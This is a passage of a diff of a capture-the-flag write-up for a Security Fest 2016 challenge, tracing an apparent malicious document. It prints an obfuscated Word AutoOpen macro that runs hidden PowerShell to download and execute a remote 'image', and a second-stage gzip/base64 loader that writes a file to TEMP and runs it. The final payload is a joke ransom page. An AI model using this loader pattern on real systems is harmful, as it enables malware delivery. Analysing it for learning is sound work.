-Dim <span class=nb>exec</span> As String
-<span class=nb>exec</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span> + <span class=s2>&#34;p&#34;</span> <span class=p>&amp;</span> <span class=s2>&#34;owerS&#34;</span> + <span class=s2>&#34;h&#34;</span> + <span class=s2>&#34;ell.e&#34;</span> + <span class=s2>&#34;x&#34;</span> + <span class=s2>&#34;e -NoP -NonI -W Hidden -Exec Bypass -Comm&#34;</span>
-<span class=nb>exec</span> <span class=o>=</span> <span class=nb>exec</span> + <span class=s2>&#34;and &#34;&#34;</span><span class=nv>$C0r3s3c</span><span class=s2>=new-object net.webclient;&#34;</span>
-<span class=nb>exec</span> <span class=o>=</span> <span class=nb>exec</span> + <span class=s2>&#34;</span><span class=nv>$C0r3s3c</span><span class=s2>.proxy=[Net.WebRequest]::GetSystemWebPr&#34;</span>
-<span class=nb>exec</span> <span class=o>=</span> <span class=nb>exec</span> + <span class=s2>&#34;oxy(); </span><span class=nv>$C0r3s3c</span><span class=s2>.Proxy.Credentials=[Net.Credenti&#34;</span>
-<span class=nb>exec</span> <span class=o>=</span> <span class=nb>exec</span> + <span class=s2>&#34;alCache]::DefaultCredentials;IEX </span><span class=nv>$C0r3s3c</span><span class=s2>.downl&#34;</span>
-<span class=nb>exec</span> <span class=o>=</span> <span class=nb>exec</span> + <span class=s2>&#34;oadstring(&#39;http://www.&#34;</span> + <span class=s2>&#34;c&#34;</span> <span class=p>&amp;</span> <span class=s2>&#34;o&#34;</span> + <span class=s2>&#34;res&#34;</span> <span class=p>&amp;</span> <span class=s2>&#34;&#34;</span>
-<span class=nb>exec</span> <span class=o>=</span> <span class=nb>exec</span> + <span class=s2>&#34;e&#34;</span> + <span class=s2>&#34;c&#34;</span> <span class=p>&amp;</span> <span class=s2>&#34;sy&#34;</span> + <span class=s2>&#34;ste&#34;</span> <span class=p>&amp;</span> <span class=s2>&#34;ms&#34;</span> + <span class=s2>&#34;.com/cs5/co&#34;</span>
-<span class=nb>exec</span> <span class=o>=</span> <span class=nb>exec</span> + <span class=s2>&#34;resec-logo.png&#39;);&#34;</span>
-Shell <span class=o>(</span><span class=nb>exec</span><span class=o>)</span>
-End Sub
-</code></pre></td></tr></table>
-</div>
-</div><p>Aha, the script is downloading an image from this location <code>http://coresecsystems.com/cs5/coresec-logo.png</code>, I wonder what it is? After downloading the image with <code>wget</code> and inspecting the file I get:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./oledump.py -v -s <span class=m>3</span> vbaProject.bin
+</span></span><span class=line><span class=cl>Attribute <span class=nv>VB_Name</span> <span class=o>=</span> <span class=s2>&#34;NewMacros&#34;</span>
+</span></span><span class=line><span class=cl>Sub AutoOpen<span class=o>()</span>
+</span></span><span class=line><span class=cl>Dim <span class=nb>exec</span> As String
+</span></span><span class=line><span class=cl><span class=nb>exec</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span> + <span class=s2>&#34;p&#34;</span> <span class=p>&amp;</span> <span class=s2>&#34;owerS&#34;</span> + <span class=s2>&#34;h&#34;</span> + <span class=s2>&#34;ell.e&#34;</span> + <span class=s2>&#34;x&#34;</span> + <span class=s2>&#34;e -NoP -NonI -W Hidden -Exec Bypass -Comm&#34;</span>
+</span></span><span class=line><span class=cl><span class=nb>exec</span> <span class=o>=</span> <span class=nb>exec</span> + <span class=s2>&#34;and &#34;&#34;</span><span class=nv>$C0r3s3c</span><span class=s2>=new-object net.webclient;&#34;</span>
+</span></span><span class=line><span class=cl><span class=nb>exec</span> <span class=o>=</span> <span class=nb>exec</span> + <span class=s2>&#34;</span><span class=nv>$C0r3s3c</span><span class=s2>.proxy=[Net.WebRequest]::GetSystemWebPr&#34;</span>
+</span></span><span class=line><span class=cl><span class=nb>exec</span> <span class=o>=</span> <span class=nb>exec</span> + <span class=s2>&#34;oxy(); </span><span class=nv>$C0r3s3c</span><span class=s2>.Proxy.Credentials=[Net.Credenti&#34;</span>
+</span></span><span class=line><span class=cl><span class=nb>exec</span> <span class=o>=</span> <span class=nb>exec</span> + <span class=s2>&#34;alCache]::DefaultCredentials;IEX </span><span class=nv>$C0r3s3c</span><span class=s2>.downl&#34;</span>
+</span></span><span class=line><span class=cl><span class=nb>exec</span> <span class=o>=</span> <span class=nb>exec</span> + <span class=s2>&#34;oadstring(&#39;http://www.&#34;</span> + <span class=s2>&#34;c&#34;</span> <span class=p>&amp;</span> <span class=s2>&#34;o&#34;</span> + <span class=s2>&#34;res&#34;</span> <span class=p>&amp;</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=nb>exec</span> <span class=o>=</span> <span class=nb>exec</span> + <span class=s2>&#34;e&#34;</span> + <span class=s2>&#34;c&#34;</span> <span class=p>&amp;</span> <span class=s2>&#34;sy&#34;</span> + <span class=s2>&#34;ste&#34;</span> <span class=p>&amp;</span> <span class=s2>&#34;ms&#34;</span> + <span class=s2>&#34;.com/cs5/co&#34;</span>
+</span></span><span class=line><span class=cl><span class=nb>exec</span> <span class=o>=</span> <span class=nb>exec</span> + <span class=s2>&#34;resec-logo.png&#39;);&#34;</span>
+</span></span><span class=line><span class=cl>Shell <span class=o>(</span><span class=nb>exec</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>End Sub
+</span></span></code></pre></td></tr></table></div></div><p>Aha, the script is downloading an image from this location <code>http://coresecsystems.com/cs5/coresec-logo.png</code>, I wonder what it is? After downloading the image with <code>wget</code> and inspecting the file I get:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -440,92 +294,76 @@ End Sub
 </span><span class=lnt> 9
 </span><span class=lnt>10
 </span><span class=lnt>11
-</span><span class=lnt>12
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ cat coresec-logo.png
-<span class=nv>$JavaScript</span> <span class=o>=</span> <span class=o>[</span>SySTeM.cOnVeRt<span class=o>]</span>::frOmBaSE64sTrInG<span class=o>(</span><span class=s2>&#34;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&#34;</span><span class=o>)</span>
-<span class=nv>$aes256</span> <span class=o>=</span> nEw-oBJeCt SYsTem.IO.mEmOryStrEAm
-<span class=nv>$aes256</span>.wRIte<span class=o>(</span><span class=nv>$JavaScript</span>, 0, <span class=nv>$JavaScript</span>.Length<span class=o>)</span>
-<span class=nv>$aes256</span>.SeEk<span class=o>(</span>0,0<span class=o>)</span> <span class=p>|</span> oUT-nUlL
-<span class=nv>$coresec</span> <span class=o>=</span> nEw-oBJeCt sySTeM.IO.cOMprEssIon.GZipsTReAm<span class=o>(</span><span class=nv>$aes256</span>, <span class=o>[</span>SySTem.IO.cOMpReSSiOn.CoMpResSiOnmODe<span class=o>]</span>::dECoMpReSs<span class=o>)</span>
-<span class=nv>$securityfest2016</span> <span class=o>=</span> nEw-oBjeCt SySTem.IO.StrEAmREAder<span class=o>(</span><span class=nv>$coresec</span><span class=o>)</span>
-<span class=nv>$begin_attack</span> <span class=o>=</span> <span class=nv>$securityfest2016</span>.rEaDtOeNd<span class=o>()</span>
-<span class=nv>$localh0st</span> <span class=o>=</span> <span class=nv>$env</span>:TEMP
-<span class=nv>$begin_attack</span><span class=p>|</span> oUT-fILe <span class=o>(</span><span class=nv>$localh0st</span> + <span class=s1>&#39;\cOrEsEc-cTf.HtMl&#39;</span><span class=o>)</span>
-IeX <span class=o>(</span><span class=nv>$localh0st</span> + <span class=s1>&#39;\cOrEsEc-cTf.HtMl&#39;</span><span class=o>)</span>
-
-</code></pre></td></tr></table>
-</div>
-</div><p>First thing I noticed was the base64 data. Decoding the data reveals garbage data, so there has to be something else going on. Reading the code more carefully reveals that it is decompressing data further down:</p>
-<pre tabindex=0><code>$coresec = nEw-oBJeCt sySTeM.IO.cOMprEssIon.GZipsTReAm($aes256, [SySTem.IO.cOMpReSSiOn.CoMpResSiOnmODe]::dECoMpReSs)
-</code></pre><p>The base64 encoded data contains the compressed data, that&rsquo;s why it showed me garbage when I decoded it. I saved the base64 encoded to its own file and ran the following to decompress the data: <code>cat base.txt | base64 --decode > lol.zip</code></p>
-<p>Running the <code>file</code> command did indeed report that it was a compressed file.</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat coresec-logo.png
+</span></span><span class=line><span class=cl><span class=nv>$JavaScript</span> <span class=o>=</span> <span class=o>[</span>SySTeM.cOnVeRt<span class=o>]</span>::frOmBaSE64sTrInG<span class=o>(</span><span class=s2>&#34;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&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=nv>$aes256</span> <span class=o>=</span> nEw-oBJeCt SYsTem.IO.mEmOryStrEAm
+</span></span><span class=line><span class=cl><span class=nv>$aes256</span>.wRIte<span class=o>(</span><span class=nv>$JavaScript</span>, 0, <span class=nv>$JavaScript</span>.Length<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=nv>$aes256</span>.SeEk<span class=o>(</span>0,0<span class=o>)</span> <span class=p>|</span> oUT-nUlL
+</span></span><span class=line><span class=cl><span class=nv>$coresec</span> <span class=o>=</span> nEw-oBJeCt sySTeM.IO.cOMprEssIon.GZipsTReAm<span class=o>(</span><span class=nv>$aes256</span>, <span class=o>[</span>SySTem.IO.cOMpReSSiOn.CoMpResSiOnmODe<span class=o>]</span>::dECoMpReSs<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=nv>$securityfest2016</span> <span class=o>=</span> nEw-oBjeCt SySTem.IO.StrEAmREAder<span class=o>(</span><span class=nv>$coresec</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=nv>$begin_attack</span> <span class=o>=</span> <span class=nv>$securityfest2016</span>.rEaDtOeNd<span class=o>()</span>
+</span></span><span class=line><span class=cl><span class=nv>$localh0st</span> <span class=o>=</span> <span class=nv>$env</span>:TEMP
+</span></span><span class=line><span class=cl><span class=nv>$begin_attack</span><span class=p>|</span> oUT-fILe <span class=o>(</span><span class=nv>$localh0st</span> + <span class=s1>&#39;\cOrEsEc-cTf.HtMl&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>IeX <span class=o>(</span><span class=nv>$localh0st</span> + <span class=s1>&#39;\cOrEsEc-cTf.HtMl&#39;</span><span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>First thing I noticed was the base64 data. Decoding the data reveals garbage data, so there has to be something else going on. Reading the code more carefully reveals that it is decompressing data further down:</p><pre tabindex=0><code>$coresec = nEw-oBJeCt sySTeM.IO.cOMprEssIon.GZipsTReAm($aes256, [SySTem.IO.cOMpReSSiOn.CoMpResSiOnmODe]::dECoMpReSs)
+</code></pre><p>The base64 encoded data contains the compressed data, that&rsquo;s why it showed me garbage when I decoded it. I saved the base64 encoded to its own file and ran the following to decompress the data: <code>cat base.txt | base64 --decode > lol.zip</code></p><p>Running the <code>file</code> command did indeed report that it was a compressed file.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ file lol.zip
-lol.zip: gzip compressed data, was <span class=s2>&#34;coresec-ctf.html&#34;</span>, from Unix, last modified: Wed May <span class=m>18</span> 22:05:52 <span class=m>2016</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>After unpacking the file with <code>gunzip</code> I got a HTML file.</p>
-<pre tabindex=0><code>&lt;html&gt;
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ file lol.zip
+</span></span><span class=line><span class=cl>lol.zip: gzip compressed data, was <span class=s2>&#34;coresec-ctf.html&#34;</span>, from Unix, last modified: Wed May <span class=m>18</span> 22:05:52 <span class=m>2016</span>
+</span></span></code></pre></td></tr></table></div></div><p>After unpacking the file with <code>gunzip</code> I got a HTML file.</p><pre tabindex=0><code>&lt;html&gt;
 &lt;title&gt;Files Encrypted!&lt;/title&gt;
 &lt;style&gt;
 a { color:green; }
 .tb {  background:white; border-style:solid; border-width:1px; padding:3px; border-color:lime; }
 .ttl { font-size:13px; color:880000; }
 &lt;/style&gt;
-&lt;body style=&quot;width:100%; background:#33CCFF;&quot;&gt;
+&lt;body style=&#34;width:100%; background:#33CCFF;&#34;&gt;
   &lt;center&gt;
-  &lt;div style=&quot;text-align:left; font-family:Arial; font-size:13px; line-height:20px; margin-top:10px; width:800px; background:#F4F4F4; padding:20px; border-style:solid; border-width:5px; border-color:#BABABA;&quot;&gt;
-    &lt;b&gt;&lt;font class=&quot;ttl&quot;&gt;What happened to your files?&lt;/b&gt;&lt;/font&gt;
+  &lt;div style=&#34;text-align:left; font-family:Arial; font-size:13px; line-height:20px; margin-top:10px; width:800px; background:#F4F4F4; padding:20px; border-style:solid; border-width:5px; border-color:#BABABA;&#34;&gt;
+    &lt;b&gt;&lt;font class=&#34;ttl&#34;&gt;What happened to your files?&lt;/b&gt;&lt;/font&gt;
     &lt;br&gt;
-    &lt;font style=&quot;font-size:13px;&quot;&gt;Are all of your files protected by a strong encryption with RSA-2048?&lt;br&gt;
+    &lt;font style=&#34;font-size:13px;&#34;&gt;Are all of your files protected by a strong encryption with RSA-2048?&lt;br&gt;
     Ofcourse not, this is just hopefully fun challenge provided by Coresec for Security Fest 2016.&lt;br&gt;
     And for the record RSA-2048 key is not easy to outguess.
     &lt;br&gt;
-    More information about the encryption keys using RSA-2048 can be found here: &lt;a href=&quot;http://en.wikipedia.org/wiki/RSA_(cryptosystem)&quot; target=&quot;_blank&quot;&gt;http://en.wikipedia.org/wiki/RSA_(cryptosystem)&lt;/a&gt;&lt;br&gt;&lt;/font&gt;
+    More information about the encryption keys using RSA-2048 can be found here: &lt;a href=&#34;http://en.wikipedia.org/wiki/RSA_(cryptosystem)&#34; target=&#34;_blank&#34;&gt;http://en.wikipedia.org/wiki/RSA_(cryptosystem)&lt;/a&gt;&lt;br&gt;&lt;/font&gt;
     &lt;br&gt;
-    &lt;b&gt;&lt;font class=&quot;ttl&quot;&gt;What does this mean?&lt;/b&gt;&lt;/font&gt;
+    &lt;b&gt;&lt;font class=&#34;ttl&#34;&gt;What does this mean?&lt;/b&gt;&lt;/font&gt;
     &lt;br&gt;
-    &lt;font style=&quot;font-size:13px;&quot;&gt;
+    &lt;font style=&#34;font-size:13px;&#34;&gt;
       If this had been real, I sure hope you did not run the PowerShell script without first looking carefully. Always update your PS to the latest version and turn on logging and block Execution Policy bypass. If possible block unsigned scripts. PowerShell is very powerfull but is also one of the few scripting language with good logging support by the OS. Enought rambling about this move on.
     &lt;/font&gt;
     &lt;br&gt;&lt;br&gt;
-    &lt;b&gt;&lt;font class=&quot;ttl&quot;&gt;How did this happen?&lt;/b&gt;&lt;/font&gt;
+    &lt;b&gt;&lt;font class=&#34;ttl&#34;&gt;How did this happen?&lt;/b&gt;&lt;/font&gt;
     &lt;br&gt;
-    &lt;font style=&quot;font-size:13px;&quot;&gt;
+    &lt;font style=&#34;font-size:13px;&#34;&gt;
       Well you did not focus on the talks that for sure.&lt;br&gt;
       Are all your files encrypted with the public key, nope.
       &lt;br&gt;
       Decrypting might sometimes be possible since crypto is hard for most people.
     &lt;/font&gt;
     &lt;br&gt;&lt;br&gt;
-    &lt;b&gt;&lt;font class=&quot;ttl&quot;&gt;What do I do?&lt;/b&gt;&lt;/font&gt;
+    &lt;b&gt;&lt;font class=&#34;ttl&#34;&gt;What do I do?&lt;/b&gt;&lt;/font&gt;
     &lt;br&gt;
-    &lt;font style=&quot;font-size:13px;&quot;&gt;
+    &lt;font style=&#34;font-size:13px;&#34;&gt;
       Well if you came this far in the challenge you should not let anything stop you. Find the flag! Find the flag!
       Alas, if you do not take the necessary measures for the specified time then the conditions for obtaining the flag will pass.
       &lt;br&gt;
-      Don't let file extensions fool you.
+      Don&#39;t let file extensions fool you.
     &lt;/font&gt;
     &lt;br&gt;&lt;br&gt;
-    &lt;div class=&quot;tb&quot; style=&quot;color:#880000; font-size:13px; border-width:3px;&quot;&gt;
+    &lt;div class=&#34;tb&#34; style=&#34;color:#880000; font-size:13px; border-width:3px;&#34;&gt;
       For at this time perhaps unrelated information, please visit this home page:
       &lt;hr&gt;
-      &lt;b&gt;1.&lt;a href=&quot;http://coresecsystems.com&quot; target=&quot;_blank&quot;&gt;http://coresecsystems.com&lt;/a&gt;&lt;/b&gt;
+      &lt;b&gt;1.&lt;a href=&#34;http://coresecsystems.com&#34; target=&#34;_blank&#34;&gt;http://coresecsystems.com&lt;/a&gt;&lt;/b&gt;
       &lt;br&gt;
     &lt;/div&gt;
     &lt;br&gt;
-    &lt;div class=&quot;tb&quot; style=&quot;font-size:13px; border-color:#880000;&quot;&gt;
+    &lt;div class=&#34;tb&#34; style=&#34;font-size:13px; border-color:#880000;&#34;&gt;
       If for some reasons the address is not available, follow these steps: &lt;hr&gt;
-      1. Download and install tor-browser: &lt;a href=&quot;http://www.torproject.org/projects/torbrowser.html.en&quot; target=&quot;_blank&quot;&gt;http://www.torproject.org/projects/torbrowser.html.en&lt;/a&gt;&lt;br&gt;
+      1. Download and install tor-browser: &lt;a href=&#34;http://www.torproject.org/projects/torbrowser.html.en&#34; target=&#34;_blank&#34;&gt;http://www.torproject.org/projects/torbrowser.html.en&lt;/a&gt;&lt;br&gt;
       2. After a successful installation, run the browser and wait for initialization.&lt;br&gt;
-      3. Type in the address bar: &lt;font style=&quot;font-weight:bold; color:#009977;&quot;&gt;F4k3C0resec.oni0n&lt;/font&gt;&lt;br&gt;
+      3. Type in the address bar: &lt;font style=&#34;font-weight:bold; color:#009977;&#34;&gt;F4k3C0resec.oni0n&lt;/font&gt;&lt;br&gt;
       4. Follow the instructions on the site.&lt;br&gt;
       &lt;br&gt;
       Just kidding move on.
@@ -533,72 +371,39 @@ a { color:green; }
     &lt;br&gt;
     &lt;br&gt;
     &lt;b&gt;IMPORTANT INFORMATION:&lt;/b&gt;&lt;br&gt;
-    &lt;div class=&quot;tb&quot; style=&quot;width:790px;&quot;&gt;
-      Your Next step &lt;b&gt;&lt;a href=&quot;http://coresecsystems.com/cs5/Coresec_logo1.png&quot; target=&quot;_blank&quot;&gt;http://coresecsystems.com/cs5/Coresec_logo1.png&lt;/a&gt;&lt;/b&gt;&lt;br&gt;
-      Your Second step (Not using TOR): &lt;font style=&quot;font-weight:bold; color:#009977;&quot;&gt;coresecsystems.com/cs5/Coresec_logo2.jpg&lt;/font&gt;&lt;br&gt;
+    &lt;div class=&#34;tb&#34; style=&#34;width:790px;&#34;&gt;
+      Your Next step &lt;b&gt;&lt;a href=&#34;http://coresecsystems.com/cs5/Coresec_logo1.png&#34; target=&#34;_blank&#34;&gt;http://coresecsystems.com/cs5/Coresec_logo1.png&lt;/a&gt;&lt;/b&gt;&lt;br&gt;
+      Your Second step (Not using TOR): &lt;font style=&#34;font-weight:bold; color:#009977;&#34;&gt;coresecsystems.com/cs5/Coresec_logo2.jpg&lt;/font&gt;&lt;br&gt;
     &lt;/div&gt;
   &lt;/div&gt;
   &lt;/center&gt;
 &lt;/body&gt;
 &lt;/html&gt;
-</code></pre><p>Alright, so far so good. Next step was to download this image <code>http://coresecsystems.com/cs5/Coresec_logo1.png</code>, according to the HTML document.</p>
-<h2 id=steganography>Steganography</h2>
-<p>Running the <code>file</code> command informed me that it was a JPEG file even though the file extension was .png.</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
